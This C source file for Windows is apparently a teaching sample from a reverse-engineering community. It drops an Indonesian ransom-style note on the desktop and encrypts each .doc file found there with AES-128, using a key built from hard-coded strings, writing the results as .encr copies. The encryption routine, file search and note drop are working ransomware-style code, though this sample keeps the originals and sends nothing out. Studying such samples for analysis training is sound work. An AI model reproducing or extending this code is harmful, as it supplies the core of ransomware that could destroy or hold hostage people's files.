#pragma comment(lib, "crypt32.lib")
#include <stdio.h>
#include <stdlib.h>
#include <windows.h>
#include <shlobj.h>
#include <wincrypt.h>
#include <assert.h>

char deskpath[1024];

const char *msg = 
"Ini contoh aksi malware sederhana: menciptakan sebuah file\r\n"
"Jika ini malware beneran, sudah game over.\r\n"
"Malware sesungguhnya mungkin sudah mengenkrip file Anda atau menginfeksi PC lain\r\n"
"yohanes@gmail.com\r\n";

//code from: http://etutorials.org/Programming/secure+programming/Chapter+5.+Symmetric+Encryption/5.25+Using+Symmetric+Encryption+with+Microsoft+s+CryptoAPI/

static HCRYPTPROV SpcGetCryptContext(void) {
  HCRYPTPROV hProvider;
   
  if (!CryptAcquireContext(&hProvider, 0, MS_ENH_RSA_AES_PROV, PROV_RSA_AES,
                           CRYPT_VERIFYCONTEXT)) return 0;
  return hProvider;
}

static HCRYPTKEY SpcGetDerivedKey(HCRYPTPROV hProvider, ALG_ID Algid, LPTSTR password) {
  BOOL       bResult;
  DWORD      cbData;
  HCRYPTKEY  hKey;
  HCRYPTHASH hHash;
   
  if (!CryptCreateHash(hProvider, CALG_SHA_256, 0, 0, &hHash))  { printf("HASH PROBLEM \n"); return 0;};
  cbData = lstrlen(password) * sizeof(TCHAR);
  if (!CryptHashData(hHash, (BYTE *)password, cbData, 0)) {
	printf("HASHING PROBLEM\n");
    CryptDestroyHash(hHash);
    return 0;
  }
  bResult = CryptDeriveKey(hProvider, Algid, hHash, CRYPT_EXPORTABLE, &hKey);
  CryptDestroyHash(hHash);
  if (!bResult) {
	printf("derivekey problem\n");
DWORD  dwStatus = GetLastError();
        printf("CryptDeriveKey failed: %x\n", dwStatus);
  }

  return (bResult ? hKey : 0);
}

BOOL SpcSetKeyMode(HCRYPTKEY hKey, DWORD dwMode) {
  return CryptSetKeyParam(hKey, KP_MODE, (BYTE *)&dwMode, 0);
}
   
#define SpcSetMode_CBC(hKey) SpcSetKeyMode((hKey), CRYPT_MODE_CBC)
#define SpcSetMode_CFB(hKey) SpcSetKeyMode((hKey), CRYPT_MODE_CFB)
#define SpcSetMode_ECB(hKey) SpcSetKeyMode((hKey), CRYPT_MODE_ECB)
#define SpcSetMode_OFB(hKey) SpcSetKeyMode((hKey), CRYPT_MODE_OFB)

BOOL SpcSetIV(HCRYPTPROV hProvider, HCRYPTKEY hKey, BYTE *pbIV) {
  BOOL  bResult;
  BYTE  *pbTemp;
  DWORD dwBlockLen, dwDataLen;
   
  if (!pbIV) {
    dwDataLen = sizeof(dwBlockLen);
    if (!CryptGetKeyParam(hKey, KP_BLOCKLEN, (BYTE *)&dwBlockLen, &dwDataLen, 0))
      return FALSE;
    dwBlockLen /= 8;
    if (!(pbTemp = (BYTE *)LocalAlloc(LMEM_FIXED, dwBlockLen))) return FALSE;
    bResult = CryptGenRandom(hProvider, dwBlockLen, pbTemp);
    if (bResult)
      bResult = CryptSetKeyParam(hKey, KP_IV, pbTemp, 0);
    LocalFree(pbTemp);
    return bResult;
  }
  return CryptSetKeyParam(hKey, KP_IV, pbIV, 0);
}

BYTE *SpcEncrypt(HCRYPTKEY hKey, BOOL bFinal, BYTE *pbData, DWORD *cbData) {
  BYTE   *pbResult;
  DWORD  dwBlockLen, dwDataLen;
  ALG_ID Algid;
   
  dwDataLen = sizeof(ALG_ID);
  if (!CryptGetKeyParam(hKey, KP_ALGID, (BYTE *)&Algid, &dwDataLen, 0)) {
	return 0;
}
  if (GET_ALG_TYPE(Algid) != ALG_TYPE_STREAM) {
    dwDataLen = sizeof(DWORD);
    if (!CryptGetKeyParam(hKey, KP_BLOCKLEN, (BYTE *)&dwBlockLen, &dwDataLen, 0)) {

      return 0;
	}


    dwDataLen = ((*cbData + (dwBlockLen * 2) - 1) / dwBlockLen) * dwBlockLen;

DWORD tmpcbdata = *cbData;

    if (!(pbResult = (BYTE *)LocalAlloc(LMEM_FIXED, dwDataLen))) return 0;
    CopyMemory(pbResult, pbData, *cbData);

    if (!CryptEncrypt(hKey, 0, bFinal, 0, pbResult, &tmpcbdata, dwDataLen)) {
DWORD  dwStatus = GetLastError();


      LocalFree(pbResult);
      return 0;
    }
    *cbData = tmpcbdata;
    return pbResult;
  }
   
  if (!(pbResult = (BYTE *)LocalAlloc(LMEM_FIXED, *cbData))) return 0;
  CopyMemory(pbResult, pbData, *cbData);
  if (!CryptEncrypt(hKey, 0, bFinal, 0, pbResult, cbData, *cbData)) {
    LocalFree(pbResult);
    return 0;
  }
  return pbResult;
}

static void create_file()
{
	char filepath[1024];

	SHGetSpecialFolderPath(0, deskpath, CSIDL_DESKTOPDIRECTORY, FALSE);
	sprintf(filepath, "%s\\BACA-reversing.id.txt", deskpath);
	FILE *f=fopen(filepath, "w");
	if (f) {
		fprintf(f, msg);
		fclose(f);
	}
}


void encrypt_file(HCRYPTKEY key,  const char *filepath, DWORD size)
{
	char filepath_enc[1024];
	strcpy(filepath_enc, filepath);
	strcat(filepath_enc, ".encr");

	char *data = 0;


	FILE *fo = 0;
	FILE *fi = 0;

	fo = fopen(filepath_enc, "wb");
	if (!fo) goto fail;
	fi = fopen(filepath, "rb");
	if (!fi) goto fail;
	
	data = (char *)malloc(size);
	fread(data, size, 1, fi);
	DWORD outlen;
	outlen  = size;
	BYTE *res = SpcEncrypt(key, TRUE, data, &outlen);
	fwrite(res, outlen, 1, fo);
	
fail:
	if (fi) fclose(fi);
	if (fo) fclose(fo);
	if (data) free(data);

}


static const char *KEY1= "reversing.id";
static const char *KEY2= "thekey";
static const char *KEY3= "encryption";

void encrypt_desktop()
{
	SHGetSpecialFolderPath(0, deskpath, CSIDL_DESKTOPDIRECTORY, FALSE);
	char filepath[1024];
	char filepath_tmp[1024];
	char enckey[128];

	HCRYPTPROV prov = SpcGetCryptContext();
	assert(prov);

	sprintf(enckey, "%s|%s|%s", KEY2+1, KEY1+2, KEY3);
	HCRYPTKEY key = SpcGetDerivedKey(prov, CALG_AES_128, enckey);
	assert(key);

	snprintf(filepath,sizeof(filepath), "%s\\*.doc", deskpath);
	WIN32_FIND_DATAA data;
	HANDLE hFind;
	hFind = FindFirstFileA(filepath, &data);
	if (hFind != INVALID_HANDLE_VALUE) {
        	do {
		    snprintf(filepath_tmp,sizeof(filepath_tmp), "%s\\%s", deskpath, data.cFileName);
		    encrypt_file(key, filepath_tmp, data.nFileSizeLow);
	        } while (FindNextFile(hFind, &data));
	        FindClose(hFind);
   	}
}


int main(int argc, char *argv[])
{
	create_file();
	encrypt_desktop();
	
	return 0;
}
